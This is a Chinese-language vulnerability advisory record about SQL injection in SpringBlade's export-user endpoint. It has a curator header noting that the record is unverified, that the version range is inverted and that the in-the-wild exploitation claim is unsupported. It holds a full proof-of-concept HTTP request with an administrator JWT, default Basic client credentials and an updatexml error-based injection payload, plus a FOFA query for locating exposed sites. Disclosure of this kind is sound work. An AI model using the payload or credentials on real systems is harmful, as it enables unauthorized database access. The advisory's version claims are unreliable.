---
fofa: ""
source: "SourByte05/Vulnerability-Wiki-PoC"
product: "SpringBlade/export-user"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
fofa_unverified: "body="
title: "SpringBlade export-user SQL 注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：正文<=3.2.0，影响行反向>=3.2.0；需后台导出权限"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-133f9277100190b67500d5ab"
entity_id: "ve-133f9277100190b67500d5ab"
schema_version: "1"
---

## 核对与使用边界

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：正文&lt;=3.2.0，影响行反向&gt;=3.2.0；需后台导出权限

代码与实验材料：长查询JWT、updatexml(user())报错请求，没有Excel导出或响应；Basic客户端凭据额外出现

来源证据范围：转载/语雀来源可追溯，未给对应官方修复提交或完整权限模型

- **结论使用边界（1）**：影响比较符反向；依据：描述v3.2.0及以前，影响行却v3.2.0 &lt;= SpringBlade。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：敏感导出与在野结论无证据；依据：仅错误注入请求，无Excel或用户名密码数据；状态表称已知在野无出处。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **代码与转录边界（3）**：FOFA截断及认证材料混入URL；依据：元数据body=；完整长期JWT在query，容易进日志，需占位。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# SpringBlade export-user SQL 注入漏洞预警

# 漏洞描述

SpringBlade v3.2.0 及之前版本框架后台 export-user 路径存在安全漏洞，攻击者利用该漏洞可通过组件customSqlSegment 进行SQL注入攻击，攻击者可将用户名、密码等敏感信息通过 excel 导出。

# 影响范围

v3.2.0  <= SpringBlade

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | [已公开] | [已公开] | [已知] |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 【高危】 |
| 影响面 | 【广】 |
| 攻击者价值 | 【中】 |
| 利用难度 | 【低】 |

# 漏洞复现

FOFA：body="https://bladex.vip"

POC/EXP：

GET /api/blade-user/export-user?Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ&account=&realName=&1-updatexml(1,concat(0x7e,(select+user%28%29),0x7e),1)=1 HTTP/1.1
Host: 127.0.0.1:8085
Accept: application/json, text/plain, */*
DNT: 1
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Referer: http://127.0.0.1:8085/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


# 修复方案

**官方修复：**

1、⼚商已发布了漏洞修复程序，请及时关注更新：https://github.com/chillzhuang/blade-tool

2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。

3、如⾮必要，禁⽌公⽹访问该系统。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
